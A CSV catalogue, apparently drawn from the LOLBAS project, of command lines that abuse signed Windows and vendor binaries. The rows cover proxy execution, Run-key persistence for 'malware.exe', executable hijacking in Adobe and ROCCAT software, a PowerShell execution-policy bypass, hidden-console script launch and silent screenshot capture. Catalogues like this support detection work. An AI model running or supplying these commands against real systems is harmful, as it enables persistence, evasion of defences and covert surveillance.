Command,Name,Description,Usecase,Category,MitreID
Nvudisp.exe System calc.exe,Nvudisp.exe,Execute calc.exe as a subprocess.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
Nvudisp.exe Copy test.txt*test-2.txt,Nvudisp.exe,Copy fila A to file B.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
Nvudisp.exe SetReg HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\malware=malware.exe,Nvudisp.exe,Add/Edit a Registry key value.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
Nvudisp.exe CreateShortcut test.lnk*"Test"*"c:\windows\system32\calc.exe\"*""*"c:\windows\system32\",Nvudisp.exe,Create shortcut file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
Nvudisp.exe KillApp calculator.exe,Nvudisp.exe,Kill a process.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
Nvudisp.exe Run foo,Nvudisp.exe,Run process,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvudisp.yml
"C:\Program Files\Avast Software\Avast\aswrundll" "C:\Users\Public\Libraries\tempsys\module.dll",aswrundll.exe,Load and execute modules using aswrundll,Execute malicious modules using aswrundll.exe,Execute,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/aswrundll.yml
Replace C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe by your binary,AcroRd32.exe,Hijack RdrCEF.exe with a payload executable to launch when opening Adobe,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/AcroRd32.yml
Replace ROCCAT_Swarm_Monitor.exe with your binary.exe,ROCCAT_Swarm.exe,Hijack ROCCAT_Swarm_Monitor.exe and launch payload when executing ROCCAT_Swarm.exe,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/ROCCAT_Swarm.yml
nvuhda6.exe System calc.exe,Nvuhda6.exe,Execute calc.exe as a subprocess.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
nvuhda6.exe Copy test.txt*test-2.txt,Nvuhda6.exe,Copy fila A to file B.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
nvuhda6.exe SetReg HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\malware=malware.exe,Nvuhda6.exe,Add/Edit a Registry key value,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
nvuhda6.exe CreateShortcut test.lnk*"Test"*"C:\Windows\System32\calc.exe"*""*"C:\Windows\System32\",Nvuhda6.exe,Create shortcut file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
nvuhda6.exe KillApp calc.exe,Nvuhda6.exe,Kill a process.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
nvuhda6.exe Run foo,Nvuhda6.exe,Run process,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nvuhda6.yml
NLNOTES.EXE /authenticate "=N:\Lotus\Notes\Data\notes.ini" -Command if((Get-ExecutionPolicy ) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass },Nlnotes.exe,Run PowerShell via LotusNotes.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Nlnotes.yml
Update.exe --processStart payload.exe --process-start-args "whatever args",Update.exe,Copy your payload into "%localappdata%\Whatsapp\app-[version]\". Then run the command. Update.exe will execute the file you copied.,Execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Upload.yml
Notes.exe "=N:\Lotus\Notes\Data\notes.ini" -Command if((Get-ExecutionPolicy) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass },Notes.exe,Run PowerShell via LotusNotes.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Notes.yml
VBoxDrvInst.exe driver executeinf c:\temp\calc.inf,VBoxDrvInst.exe,Set registry key-value for persistance via INF file call through VBoxDrvInst.exe,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/VBoxDrvInst.yml
RunCmd_X64 file.cmd /F,RunCmd_X64.exe,Launch command file and hide the console window,Run applications and scripts using Acer's RunCmd,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/RunCmd_X64.yml
Gpup.exe -w whatever -e c:\Windows\System32\calc.exe,Gpup.exe,Execute another command through gpup.exe (Notepad++ binary).,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Gpup.yml
Run Setup.exe,Setup.exe,Hijack hpbcsiServiceMarshaller.exe and run Setup.exe to launch a payload.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Setup.yml
Usbinst.exe InstallHinfSection "DefaultInstall 128 c:\temp\calc.inf",Usbinst.exe,Execute calc.exe through DefaultInstall Section Directive in INF file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherBinaries/Usbinst.yml
cscript testxlst.js C:\test\test.xml c:\test\test.xls c:\test\test.out,testxlst.js,Test Jscript included in Python tool to perform XSL transform (for payload execution).,,Execution,T1064,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherScripts/Testxlst.yml
wscript testxlst.js C:\test\test.xml c:\test\test.xls c:\test\test.out,testxlst.js,Test Jscript included in Python tool to perform XSL transform (for payload execution).,,Execution,T1064,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherScripts/Testxlst.yml
psr.exe /start /gui 0 /output c:\users\user\out.zip,Psr.exe,Capture screenshots of the desktop and save them in the target .ZIP file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Psr.yml
psr.exe /start /maxsc 100 /gui 0 /output c:\users\user\out.zip,Psr.exe,Capture a maximum of 100 screenshots of the desktop and save them in the target .ZIP file.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Psr.yml
psr.exe /stop,Psr.exe,Stop the Problem Step Recorder.,,,,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Psr.yml
